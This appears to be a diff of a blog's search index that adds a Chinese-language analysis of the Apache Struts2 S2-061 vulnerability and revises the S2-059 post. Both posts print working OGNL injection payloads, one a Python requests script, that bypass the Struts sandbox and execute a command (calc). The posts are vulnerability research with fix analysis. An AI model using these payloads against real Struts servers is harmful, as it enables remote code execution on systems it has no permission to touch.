@@ -4,11 +4,34 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-061</title>
+    <link href="/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-061/"/>
+    <url>/2022/04/17/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-061/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.25，这里使用struts 2.5.25。</p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061" target="_blank" rel="noopener">官方通告</a>，主要看沙盒绕过方式，需要引入一个老朋友依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.2.2&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>现有的沙盒限制主要位于SecurityMemberAccess类中，类型如下：</p><ul><li><p>无法new一个对象，由isClassExcluded函数负责，前面的callConstructor函数将target设置为一个class，isAccessible函数中获得的targetClass就为Class.class，触发isClassExcluded函数中的：</p><pre><code class="java">clazz == Class.class &amp;&amp; !allowStaticMethodAccess</code></pre></li><li><p>无法调用黑名单类和包的方法、属性，由isPackageExcluded等函数负责</p></li><li><p>无法使用反射，由isClassExcluded函数负责，由于将java.lang.Object和java.lang.Class放入黑名单，而反射需要调用它们的getClass、getDeclaredMethod等函数</p></li><li><p>无法调用静态方法，由Modifier.isStatic和allowStaticMethodAccess属性负责</p></li></ul><p>还在OgnlRuntime的invokeMethod函数中以写死的方式禁止了一些类，即绕过沙盒也无法使用它们。</p><p>我们现在还剩下的手段，就只有调用已实例化对象的非静态函数了。</p><p>#application中存在一个DefaultInstanceManager对象：</p><p><img src="/css/images/S2-061/2022041601.png" srcset="/img/loading.gif" alt=""></p><p>其newInstance函数如下：</p><pre><code class="java">public Object newInstance(String className) throws IllegalAccessException, InvocationTargetException, NamingException, InstantiationException, ClassNotFoundException, IllegalArgumentException, NoSuchMethodException, SecurityException {    Class&lt;?&gt; clazz = this.loadClassMaybePrivileged(className, this.classLoader);    return this.newInstance(clazz.getConstructor().newInstance(), clazz);}private Object newInstance(Object instance, Class&lt;?&gt; clazz) throws IllegalAccessException, InvocationTargetException, NamingException {    if (!this.ignoreAnnotations) {        Map&lt;String, String&gt; injections = this.assembleInjectionsFromClassHierarchy(clazz);        this.populateAnnotationsCache(clazz, injections);        this.processAnnotations(instance, injections);        this.postConstruct(instance, clazz);    }    return instance;}</code></pre><p>可以通过一个字符串创建一个新的对象，但是要求该类存在public的无参构造函数。</p><p>老朋友依赖中的org.apache.commons.collections.BeanMap类存在public的无参构造函数：</p><pre><code class="java">public BeanMap() {}</code></pre><p>其setBean函数如下：</p><pre><code class="java">public void setBean(Object newBean) {    this.bean = newBean;    this.reinitialise();}</code></pre><p>reinitialise函数：</p><pre><code class="java">protected void reinitialise() {    readMethods.clear();    writeMethods.clear();    types.clear();    initialise();}private void initialise() {    if(getBean() == null) return;    Class  beanClass = getBean().getClass();    try {        //BeanInfo beanInfo = Introspector.getBeanInfo( bean, null );        BeanInfo beanInfo = Introspector.getBeanInfo( beanClass );        PropertyDescriptor[] propertyDescriptors = beanInfo.getPropertyDescriptors();        if ( propertyDescriptors != null ) {            for ( int i = 0; i &lt; propertyDescriptors.length; i++ ) {                PropertyDescriptor propertyDescriptor = propertyDescriptors[i];                if ( propertyDescriptor != null ) {                    String name = propertyDescriptor.getName();                    Method readMethod = propertyDescriptor.getReadMethod();                    Method writeMethod = propertyDescriptor.getWriteMethod();                    Class aType = propertyDescriptor.getPropertyType();                    if ( readMethod != null ) {                        readMethods.put( name, readMethod );                    }                    if ( writeMethod != null ) {                        writeMethods.put( name, writeMethod );                    }                    types.put( name, aType );                }            }        }    }    ...}</code></pre><p>简单来说就是会获取输入的对象中的所有属性的描述符及相应的getter和setter放入对应的清空后的HashMap中。</p><p>然后其get函数：</p><pre><code class="java">public Object get(Object name) {    if ( bean != null ) {        Method method = getReadMethod( name );        if ( method != null ) {            try {                return method.invoke( bean, NULL_ARGUMENTS );            }            catch (  IllegalAccessException e ) {                logWarn( e );            }            catch ( IllegalArgumentException e ) {                logWarn(  e );            }            catch ( InvocationTargetException e ) {                logWarn(  e );            }            catch ( NullPointerException e ) {                logWarn(  e );            }        }    }    return null;}</code></pre><p>可以调用输入name的getter函数，因为OgnlValueStack中存在getContext函数，所以可以通过BeanMap获取其中存放的context：</p><pre><code class="python">data1 = {    &quot;username&quot;: &quot;%{&quot;                &quot;(#stack=#attr[&#39;struts.valueStack&#39;]).&quot;                &quot;(#beanmap=#application[&#39;org.apache.tomcat.InstanceManager&#39;].newInstance(\&quot;org.apache.commons.collections.BeanMap\&quot;)).&quot;                &quot;(#beanmap.setBean(#stack)).&quot;                &quot;(#context=#beanmap.get(\&quot;context\&quot;))&quot;                &quot;}&quot;}</code></pre><p>通过调试可以看到结果：</p><p><img src="/css/images/S2-061/2022041602.png" srcset="/img/loading.gif" alt=""></p><p>获取到context后就可以通过其getMemberAccess函数获取SecurityMemberAccess，然后就是调用其setter清空其中的黑名单，这里可以使用BeanMap的put函数：</p><pre><code class="java">public Object put(Object name, Object value) throws IllegalArgumentException, ClassCastException {    if ( bean != null ) {        Object oldValue = get( name );        Method method = getWriteMethod( name );        if ( method == null ) {            ...        try {            Object[] arguments = createWriteMethodArguments( method, value );            method.invoke( bean, arguments );            Object newValue = get( name );            firePropertyChange( name, oldValue, newValue );        }        catch ( InvocationTargetException e ) {            logInfo( e );            throw new IllegalArgumentException( e.getMessage() );        }        catch ( IllegalAccessException e ) {            logInfo( e );            throw new IllegalArgumentException( e.getMessage() );        }        return oldValue;    }    return null;}</code></pre><p>虽然源码中的freemarker.template.utility.Execute类没有无参构造函数，但我们都知道JVM会给它自己加一个，所以最后payload：</p><pre><code class="java">data1 = {    &quot;username&quot;: &quot;%{&quot;        &quot;(#stack=#attr[&#39;struts.valueStack&#39;]).&quot;        &quot;(#instanceManager=#application[&#39;org.apache.tomcat.InstanceManager&#39;]).&quot;        &quot;(#beanmap=#instanceManager.newInstance(\&quot;org.apache.commons.collections.BeanMap\&quot;)).&quot;        &quot;(#emptySet=#instanceManager.newInstance(\&quot;java.util.HashSet\&quot;)).&quot;        &quot;(#beanmap.setBean(#stack)).&quot;        &quot;(#context=#beanmap.get(\&quot;context\&quot;)).&quot;        &quot;(#beanmap.setBean(#context)).&quot;        &quot;(#memberAccess=#beanmap.get(\&quot;memberAccess\&quot;)).&quot;        &quot;(#beanmap.setBean(#memberAccess)).&quot;        &quot;(#beanmap.put(\&quot;excludedClasses\&quot;, #emptySet)).&quot;        &quot;(#beanmap.put(\&quot;excludedPackageNames\&quot;, #emptySet)).&quot;        &quot;(#args=#instanceManager.newInstance(\&quot;java.util.ArrayList\&quot;)).&quot;        &quot;(#args.add(\&quot;calc.exe\&quot;)).&quot;        &quot;(#execute=#instanceManager.newInstance(\&quot;freemarker.template.utility.Execute\&quot;)).&quot;        &quot;(#execute.exec(#args))&quot;        &quot;}&quot;}</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>同S2-059。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.26版本下，黑名单增加了：</p><pre><code class="xml">&lt;constant name=&quot;struts.excludedPackageNames&quot;          value=&quot;                 ognl.,                 java.io.,                 java.net.,                 java.nio.,                 javax.,                 freemarker.core.,                 freemarker.template.,                 freemarker.ext.jsp.,                 freemarker.ext.rhino.,                 sun.misc.,                 sun.reflect.,                 javassist.,                 org.apache.velocity.,                 org.objectweb.asm.,                 org.springframework.context.,                 com.opensymphony.xwork2.inject.,                 com.opensymphony.xwork2.ognl.,                 com.opensymphony.xwork2.security.,                 com.opensymphony.xwork2.util.,                 org.apache.tomcat.,                 org.apache.catalina.core.,                 com.ibm.websphere.,                 org.apache.geronimo.,                 org.apache.openejb.,                 org.apache.tomee.,                 org.eclipse.jetty.,                 org.mortbay.jetty.,                 org.glassfish.,                 org.jboss.as.,                 org.wildfly.,                 weblogic.,&quot; /&gt;</code></pre><p>禁止了org.apache.catalina.core.，即禁止了DefaultInstanceManager，无法再通过这个类实例化对象了。</p><p>同时populateComponentHtmlId函数中的id也变成了未经过表达式解析的%{username}，双重评估也修了。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+      <tag>Java</tag>
+      
+      <tag>Struts2</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-059</title>
     <link href="/2022/04/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-059/"/>
     <url>/2022/04/16/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-059/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.20，这里使用struts 2.5.20。</p><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-059" target="_blank" rel="noopener">官方描述</a>，问题出在struts2会对标签中的某些属性（如id）的值进行双重评估，修改模板文件：</p><pre><code class="javascript">&lt;s:a id=&quot;%{username}&quot; href=&quot;%{url}&quot;&gt;List available Employees&lt;/s:a&gt;</code></pre><p>结果部署时出问题了：</p><pre><code>[2022-04-15 10:44:26,465] Artifact struts2:war exploded: Error during artifact deployment. See server log for details.</code></pre><p>Log：</p><pre><code>java.lang.NoClassDefFoundError: javax/servlet/Filter</code></pre><p>根据<a href="https://blog.csdn.net/COFACTOR/article/details/121257359" target="_blank" rel="noopener">参考文章</a>，应该是Tomcat版本问题，引用的包发生了变化，换成Tomcat9，成功部署，其他代码不没有改动。</p><p>此时访问：</p><pre><code>http://localhost:8080/login.action?username=%25%7B8*8%7D</code></pre><p>可以看到：</p><pre><code class="javascript">&lt;a id=&quot;64&quot; href=&quot;&quot;&gt;List available Employees&lt;/a&gt;</code></pre><p>模板文件中的id值%{url}进行了双重评估，发生了表达式注入。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>同S2-057的payload，但是打不通，换成参考文章中使用的2.5.16版本的struts2就打通了，Struts 2.5.17也打不通，问题应该就出在Struts 2.5.17上面了。</p><p>在Struts 2.5.17中，此时通过：</p><pre><code>#attr[&#39;struts.valueStack&#39;].context</code></pre><p>无法获取到OgnlValueStack中的context，调试找到OgnlRuntime类的getFieldValue函数中：</p><pre><code class="java">if (checkAccessAndExistence) {    if ((f == null) || !context.getMemberAccess().isAccessible(context, target, f, propertyName)) {        result = NotFound;    }}</code></pre><p>到这里为止的代码Struts 2.5.16和Struts 2.5.17没有区别，区别在context.getMemberAccess()会获得一个版本不同的SecurityMemberAccess类进行黑名单验证：</p><pre><code class="java">Class targetClass = target.getClass();Class memberClass = member.getDeclaringClass();...if (isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) {    LOG.warn(&quot;Package of target [{}] or package of member [{}] are excluded!&quot;, target, member);    return false;}</code></pre><p>黑名单如下：</p><pre><code>[ognl., freemarker.core., javax., freemarker.ext.rhino., javassist., com.opensymphony.xwork2.security., sun.reflect., com.opensymphony.xwork2.ognl., freemarker.template., com.opensymphony.xwork2.util.]</code></pre><p>因为OgnlValueStack的package为com.opensymphony.xwork2.ognl，所以就触发了黑名单，无法获取其中的成员字段。</p><p>黑名单存放在struts-default.xml中：</p><pre><code class="xml">    &lt;constant name=&quot;struts.excludedClasses&quot;              value=&quot;                java.lang.Object,                java.lang.Runtime,                java.lang.System,                java.lang.Class,                java.lang.ClassLoader,                java.lang.Shutdown,                java.lang.ProcessBuilder,                com.opensymphony.xwork2.ActionContext&quot; /&gt;    &lt;!-- this must be valid regex, each &#39;.&#39; in package name must be escaped! --&gt;    &lt;!-- it&#39;s more flexible but slower than simple string comparison --&gt;    &lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;    &lt;!-- this is simpler version of the above used with string comparison --&gt;    &lt;constant name=&quot;struts.excludedPackageNames&quot;              value=&quot;                ognl.,                javax.,                freemarker.core.,                freemarker.template.,                freemarker.ext.rhino.,                sun.reflect.,                javassist.,                com.opensymphony.xwork2.ognl.,                com.opensymphony.xwork2.security.,                com.opensymphony.xwork2.util.&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>给ASTProperty的getValueBody函数下个断点，往前找到UIBean类的populateComponentHtmlId函数：</p><pre><code class="java">protected void populateComponentHtmlId(Form form) {    String tryId;    String generatedId;    if (id != null) {        // this check is needed for backwards compatibility with 2.1.x        tryId = findStringIfAltSyntax(id);    }     ...}</code></pre><p>findStringIfAltSyntax：</p><pre><code class="java">protected String findStringIfAltSyntax(String expr) {    if (altSyntax()) {        return findString(expr);    }    return expr;}</code></pre><p>调用了findString解析表达式。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.22中，struts-default.xml改了一下，黑名单变多了：</p><pre><code class="xml">    &lt;constant name=&quot;struts.excludedClasses&quot;              value=&quot;                java.lang.Object,                java.lang.Runtime,                java.lang.System,                java.lang.Class,                java.lang.ClassLoader,                java.lang.Shutdown,                java.lang.ProcessBuilder,                sun.misc.Unsafe,                com.opensymphony.xwork2.ActionContext&quot; /&gt;    &lt;!-- this must be valid regex, each &#39;.&#39; in package name must be escaped! --&gt;    &lt;!-- it&#39;s more flexible but slower than simple string comparison --&gt;    &lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;    &lt;!-- this is simpler version of the above used with string comparison --&gt;    &lt;constant name=&quot;struts.excludedPackageNames&quot;              value=&quot;                ognl.,                java.io.,                java.net.,                java.nio.,                javax.,                freemarker.core.,                freemarker.template.,                freemarker.ext.jsp.,                freemarker.ext.rhino.,                sun.misc.,                sun.reflect.,                javassist.,                org.apache.velocity.,                org.objectweb.asm.,                org.springframework.context.,                com.opensymphony.xwork2.inject.,                com.opensymphony.xwork2.ognl.,                com.opensymphony.xwork2.security.,                com.opensymphony.xwork2.util.&quot; /&gt;</code></pre><p>不知道修的是什么绕过方法，但是表达式执行点没修，也就是说绕过了沙盒这里还是能打。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/8653" target="_blank" rel="noopener">https://xz.aliyun.com/t/8653</a></p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>影响版本Struts 2.0.0 - Struts 2.5.20，这里使用struts 2.5.20。</p><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-059" target="_blank" rel="noopener">官方描述</a>，问题出在struts2会对标签中的某些属性（如id）的值进行双重评估，修改模板文件：</p><pre><code class="javascript">&lt;s:a id=&quot;%{username}&quot; href=&quot;%{url}&quot;&gt;List available Employees&lt;/s:a&gt;</code></pre><p>结果部署时出问题了：</p><pre><code>[2022-04-15 10:44:26,465] Artifact struts2:war exploded: Error during artifact deployment. See server log for details.</code></pre><p>Log：</p><pre><code>java.lang.NoClassDefFoundError: javax/servlet/Filter</code></pre><p>根据<a href="https://blog.csdn.net/COFACTOR/article/details/121257359" target="_blank" rel="noopener">参考文章</a>，应该是Tomcat版本问题，引用的包发生了变化，换成Tomcat9，成功部署，其他代码不没有改动。</p><p>此时访问：</p><pre><code>http://localhost:8080/login.action?username=%25%7B8*8%7D</code></pre><p>可以看到：</p><pre><code class="javascript">&lt;a id=&quot;64&quot; href=&quot;&quot;&gt;List available Employees&lt;/a&gt;</code></pre><p>模板文件中的id值%{url}进行了双重评估，发生了表达式注入。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>同S2-057的payload：</p><pre><code class="python"># -*- coding:utf8 -*-import requestsurl = &quot;http://localhost:8080/login.action&quot;data1 = {    &quot;username&quot;: &quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#39;&#39;)).(#ognlUtil.setExcludedPackageNames(&#39;&#39;))}&quot;}data2 = {    &quot;username&quot;: &quot;%{(#context=#attr[&#39;struts.valueStack&#39;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))}&quot;}res1 = requests.post(url, data=data1)print(res1.text)res2 = requests.post(url, data=data2)print(res2.text)</code></pre><p>但是打不通，换成参考文章中使用的2.5.16版本的struts2就打通了，Struts 2.5.17也打不通，问题应该就出在Struts 2.5.17上面了。</p><p>在Struts 2.5.17中，此时通过：</p><pre><code>#attr[&#39;struts.valueStack&#39;].context</code></pre><p>无法获取到OgnlValueStack中的context，调试找到OgnlRuntime类的getFieldValue函数中：</p><pre><code class="java">if (checkAccessAndExistence) {    if ((f == null) || !context.getMemberAccess().isAccessible(context, target, f, propertyName)) {        result = NotFound;    }}</code></pre><p>到这里为止的代码Struts 2.5.16和Struts 2.5.17没有区别，区别在context.getMemberAccess()会获得一个版本不同的SecurityMemberAccess类进行黑名单验证：</p><pre><code class="java">Class targetClass = target.getClass();Class memberClass = member.getDeclaringClass();...if (isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) {    LOG.warn(&quot;Package of target [{}] or package of member [{}] are excluded!&quot;, target, member);    return false;}</code></pre><p>黑名单如下：</p><pre><code>[ognl., freemarker.core., javax., freemarker.ext.rhino., javassist., com.opensymphony.xwork2.security., sun.reflect., com.opensymphony.xwork2.ognl., freemarker.template., com.opensymphony.xwork2.util.]</code></pre><p>因为OgnlValueStack的package为com.opensymphony.xwork2.ognl，所以就触发了黑名单，无法获取其中的成员字段。</p><p>黑名单存放在struts-default.xml中：</p><pre><code class="xml">    &lt;constant name=&quot;struts.excludedClasses&quot;              value=&quot;                java.lang.Object,                java.lang.Runtime,                java.lang.System,                java.lang.Class,                java.lang.ClassLoader,                java.lang.Shutdown,                java.lang.ProcessBuilder,                com.opensymphony.xwork2.ActionContext&quot; /&gt;    &lt;!-- this must be valid regex, each &#39;.&#39; in package name must be escaped! --&gt;    &lt;!-- it&#39;s more flexible but slower than simple string comparison --&gt;    &lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;    &lt;!-- this is simpler version of the above used with string comparison --&gt;    &lt;constant name=&quot;struts.excludedPackageNames&quot;              value=&quot;                ognl.,                javax.,                freemarker.core.,                freemarker.template.,                freemarker.ext.rhino.,                sun.reflect.,                javassist.,                com.opensymphony.xwork2.ognl.,                com.opensymphony.xwork2.security.,                com.opensymphony.xwork2.util.&quot; /&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>给ASTProperty的getValueBody函数下个断点，往前找到UIBean类的populateComponentHtmlId函数：</p><pre><code class="java">protected void populateComponentHtmlId(Form form) {    String tryId;    String generatedId;    if (id != null) {        // this check is needed for backwards compatibility with 2.1.x        tryId = findStringIfAltSyntax(id);    }     ...}</code></pre><p>findStringIfAltSyntax：</p><pre><code class="java">protected String findStringIfAltSyntax(String expr) {    if (altSyntax()) {        return findString(expr);    }    return expr;}</code></pre><p>调用了findString解析表达式。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在Struts 2.5.22中，struts-default.xml改了一下，黑名单变多了：</p><pre><code class="xml">    &lt;constant name=&quot;struts.excludedClasses&quot;              value=&quot;                java.lang.Object,                java.lang.Runtime,                java.lang.System,                java.lang.Class,                java.lang.ClassLoader,                java.lang.Shutdown,                java.lang.ProcessBuilder,                sun.misc.Unsafe,                com.opensymphony.xwork2.ActionContext&quot; /&gt;    &lt;!-- this must be valid regex, each &#39;.&#39; in package name must be escaped! --&gt;    &lt;!-- it&#39;s more flexible but slower than simple string comparison --&gt;    &lt;!-- constant name=&quot;struts.excludedPackageNamePatterns&quot; value=&quot;^java\.lang\..*,^ognl.*,^(?!javax\.servlet\..+)(javax\..+)&quot; / --&gt;    &lt;!-- this is simpler version of the above used with string comparison --&gt;    &lt;constant name=&quot;struts.excludedPackageNames&quot;              value=&quot;                ognl.,                java.io.,                java.net.,                java.nio.,                javax.,                freemarker.core.,                freemarker.template.,                freemarker.ext.jsp.,                freemarker.ext.rhino.,                sun.misc.,                sun.reflect.,                javassist.,                org.apache.velocity.,                org.objectweb.asm.,                org.springframework.context.,                com.opensymphony.xwork2.inject.,                com.opensymphony.xwork2.ognl.,                com.opensymphony.xwork2.security.,                com.opensymphony.xwork2.util.&quot; /&gt;</code></pre><p>不知道修的是什么绕过方法，但是表达式执行点没修，也就是说绕过了沙盒这里还是能打。</p><hr><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/8653" target="_blank" rel="noopener">https://xz.aliyun.com/t/8653</a></p>]]></content>
     
     
     
@@ -1958,9 +1981,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -2067,9 +2090,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>PHP</tag>
       
@@ -2090,9 +2113,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2113,9 +2136,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2180,9 +2203,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -2205,9 +2228,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>FastCGI</tag>
       
@@ -2228,9 +2251,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Mongodb</tag>
       
@@ -2253,9 +2276,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Python</tag>
       
@@ -2276,9 +2299,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -2362,9 +2385,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -2429,13 +2452,13 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
       
-      <tag>NodeJS</tag>
+      <tag>Web</tag>
       
       <tag>复现</tag>
+      
+      <tag>NodeJS</tag>
       
       <tag>前端</tag>
       
@@ -2456,9 +2479,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -2477,9 +2500,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
@@ -2521,9 +2544,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Java</tag>
       
@@ -2548,9 +2571,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2592,9 +2615,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2613,9 +2636,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>Karaf</tag>
       
@@ -2845,9 +2868,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>前端</tag>
       
